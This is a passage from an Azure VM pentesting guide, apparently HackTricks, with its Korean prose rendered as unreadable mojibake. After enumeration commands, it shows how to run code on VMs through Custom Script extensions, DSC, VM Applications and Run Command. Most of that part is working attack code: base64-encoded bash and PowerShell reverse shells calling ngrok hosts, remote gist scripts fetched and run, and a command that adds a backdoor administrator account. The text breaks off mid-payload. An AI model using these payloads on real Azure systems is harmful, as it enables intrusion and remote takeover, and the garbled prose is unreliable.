Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)

# Disks
## List all disks and get info about one
Get-AzDisk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>

# Snapshots
## List all galleries abd get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all snapshots and get info about one
Get-AzSnapshot
Get-AzSnapshot -Name <SnapshotName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>

# Bastion
## List bastions
Get-AzBastion

# Network
## List all VNets in your subscription
Get-AzVirtualNetwork

## List VNet peering connections for a given VNet
(Get-AzVirtualNetwork -ResourceGroupName <ResourceGroupName> -Name <VNetName>).VirtualNetworkPeerings

## List Shared Resources (e.g., Azure Firewall) in the Hub
Get-AzFirewall

## List VPN Gateways
Get-AzVirtualNetworkGateway -ResourceGroupName <ResourceGroupName>

## List VPN Connections
Get-AzVirtualNetworkGatewayConnection -ResourceGroupName <ResourceGroupName>

## List ExpressRoute Circuits
Get-AzExpressRouteCircuit

# Misc
## List all virtual machine scale sets
Get-AzVmss

## List all availability sets
Get-AzAvailabilitySet

## List all load balancers
Get-AzLoadBalancer

## List all storage accounts
Get-AzStorageAccount

## List all custom script extensions on a specific VM
Get-AzVMExtension -VMName <VmName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## VMsì—ì„œ ì½”ë“œ ì‹¤í–‰

### VM í™•ì¥

Azure VM í™•ì¥ì€ Azure ê°€ìƒ ë¨¸ì‹ (VM)ì—ì„œ **ë°°í¬ í›„ êµ¬ì„±** ë° ìë™í™” ì‘ì—…ì„ ì œê³µí•˜ëŠ” ì‘ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì…ë‹ˆë‹¤.

ì´ê²ƒì€ **VM ë‚´ë¶€ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

í•„ìš”í•œ ê¶Œí•œì€ **`Microsoft.Compute/virtualMachines/extensions/write`**ì…ë‹ˆë‹¤.

ì‚¬ìš© ê°€ëŠ¥í•œ ëª¨ë“  í™•ì¥ì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# It takes some mins to run
Get-AzVMExtensionImage -Location <Location> -PublisherName <PublisherName> -Type <Type>
```
{% endcode %}
{% endtab %}
{% endtabs %}


ì‚¬ìš©ì ì •ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” **ì‚¬ìš©ì ì •ì˜ í™•ì¥ì„ ì‹¤í–‰í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤**:

{% tabs %}
{% tab title="Linux" %}
* ë¦¬ë²„ìŠ¤ ì…¸ ì‹¤í–‰

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* ì¸í„°ë„·ì— ìœ„ì¹˜í•œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* ë¦¬ë²„ìŠ¤ ì…¸ ì‹¤í–‰

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* íŒŒì¼ì—ì„œ ë¦¬ë²„ìŠ¤ ì…¸ ì‹¤í–‰

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

ë‹¤ë¥¸ í˜ì´ë¡œë“œë„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* VMAccess í™•ì¥ì„ ì‚¬ìš©í•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì •

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### ê´€ë ¨ VM í™•ì¥

í•„ìš”í•œ ê¶Œí•œì€ ì—¬ì „íˆ **`Microsoft.Compute/virtualMachines/extensions/write`**ì…ë‹ˆë‹¤.

<details>

<summary>VMAccess í™•ì¥</summary>

ì´ í™•ì¥ì€ Windows VM ë‚´ì˜ ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •(ë˜ëŠ” ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš° ìƒì„±)í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

ì´ê²ƒì€ Azure Windows VMì˜ êµ¬ì„±ì„ ê´€ë¦¬í•˜ê¸° ìœ„í•´ PowerShell DSCë¥¼ ì‚¬ìš©í•˜ëŠ” Microsoftì˜ **VM í™•ì¥**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ í™•ì¥ì„ í†µí•´ Windows VMì—ì„œ **ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰**í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

<summary>í•˜ì´ë¸Œë¦¬ë“œ ëŸ°ë¶ ì›Œì»¤</summary>

ì´ê²ƒì€ ìë™í™” ê³„ì •ì—ì„œ VMì—ì„œ ëŸ°ë¶ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í•´ì£¼ëŠ” VM í™•ì¥ì…ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [ìë™í™” ê³„ì • ì„œë¹„ìŠ¤](../az-automation-account/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

</details>

### VM ì• í”Œë¦¬ì¼€ì´ì…˜

ì´ê²ƒì€ VMì—ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‰½ê²Œ ì¶”ê°€í•˜ê³  ì œê±°í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” **ì• í”Œë¦¬ì¼€ì´ì…˜ ë°ì´í„° ë° ì„¤ì¹˜ ë° ì œê±° ìŠ¤í¬ë¦½íŠ¸**ê°€ í¬í•¨ëœ íŒ¨í‚¤ì§€ì…ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

ì‘ìš© í”„ë¡œê·¸ë¨ì´ íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ì—ì„œ ë‹¤ìš´ë¡œë“œë˜ëŠ” ê²½ë¡œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* Linux: `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows: `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

ìƒˆ ì‘ìš© í”„ë¡œê·¸ë¨ ì„¤ì¹˜ ë°©ë²•ì€ [ì—¬ê¸°](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

{% hint style="danger" %}
ê°œë³„ ì•±ê³¼ ê°¤ëŸ¬ë¦¬ë¥¼ ë‹¤ë¥¸ êµ¬ë…ì´ë‚˜ í…Œë„ŒíŠ¸ì™€ **ê³µìœ í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤**. ì´ëŠ” ê³µê²©ìê°€ ì‘ìš© í”„ë¡œê·¸ë¨ì— ë°±ë„ì–´ë¥¼ ì„¤ì¹˜í•˜ê³  ë‹¤ë¥¸ êµ¬ë… ë° í…Œë„ŒíŠ¸ë¡œ ì´ë™í•  ìˆ˜ ìˆê²Œ í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë§¤ìš° í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤.
{% endhint %}

í•˜ì§€ë§Œ **vm ì•±ì„ ìœ„í•œ "ë§ˆì¼“í”Œë ˆì´ìŠ¤"ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. í™•ì¥ í”„ë¡œê·¸ë¨ì„ ìœ„í•œ ê²ƒì²˜ëŸ¼.

í•„ìš”í•œ ê¶Œí•œì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ì•…ìš© ì˜ˆì‹œ:

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="ìœˆë„ìš°" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### ì‚¬ìš©ì ë°ì´í„°

ì´ê²ƒì€ **ì§€ì†ì ì¸ ë°ì´í„°**ë¡œ, ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì—ì„œ ì–¸ì œë“ ì§€ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Azureì—ì„œ ì‚¬ìš©ì ë°ì´í„°ëŠ” AWS ë° GCPì™€ ë‹¤ë¥´ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. **ì—¬ê¸°ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë°°ì¹˜í•˜ë©´ ê¸°ë³¸ì ìœ¼ë¡œ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.**

### ì‚¬ìš©ì ì •ì˜ ë°ì´í„°

ì˜ˆìƒ ê²½ë¡œì— ì €ì¥ë  ë°ì´í„°ë¥¼ VMì— ì „ë‹¬í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:

* **Windows**ì—ì„œëŠ” ì‚¬ìš©ì ì •ì˜ ë°ì´í„°ê°€ `%SYSTEMDRIVE%\AzureData\CustomData.bin`ì— ì´ì§„ íŒŒì¼ë¡œ ì €ì¥ë˜ë©°, ì²˜ë¦¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Linux**ì—ì„œëŠ” `/var/lib/waagent/ovf-env.xml`ì— ì €ì¥ë˜ì—ˆê³ , í˜„ì¬ëŠ” `/var/lib/waagent/CustomData/ovf-env.xml`ì— ì €ì¥ë©ë‹ˆë‹¤.
* **Linux ì—ì´ì „íŠ¸**: ê¸°ë³¸ì ìœ¼ë¡œ ì‚¬ìš©ì ì •ì˜ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ì§€ ì•Šìœ¼ë©°, ë°ì´í„°ê°€ í™œì„±í™”ëœ ì‚¬ìš©ì ì •ì˜ ì´ë¯¸ì§€ê°€ í•„ìš”í•©ë‹ˆë‹¤.
* **cloud-init:** ê¸°ë³¸ì ìœ¼ë¡œ ì‚¬ìš©ì ì •ì˜ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ë©°, ì´ ë°ì´í„°ëŠ” [**ì—¬ëŸ¬ í˜•ì‹**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html)ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©ì ì •ì˜ ë°ì´í„°ì— ìŠ¤í¬ë¦½íŠ¸ë§Œ ë³´ë‚´ë©´ ì‰½ê²Œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* Ubuntuì™€ Debianì´ ì—¬ê¸°ì— ë„£ì€ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤.
* ì´ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ê¸° ìœ„í•´ ì‚¬ìš©ì ë°ì´í„°ë¥¼ í™œì„±í™”í•  í•„ìš”ë„ ì—†ìŠµë‹ˆë‹¤.
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **Run Command**

Azureê°€ **VMì—ì„œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰**í•˜ê¸° ìœ„í•´ ì œê³µí•˜ëŠ” ê°€ì¥ ê¸°ë³¸ì ì¸ ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. í•„ìš”í•œ ê¶Œí•œì€ `Microsoft.Compute/virtualMachines/runCommand/action`ì…ë‹ˆë‹¤.

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="ìœˆë„ìš°" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0A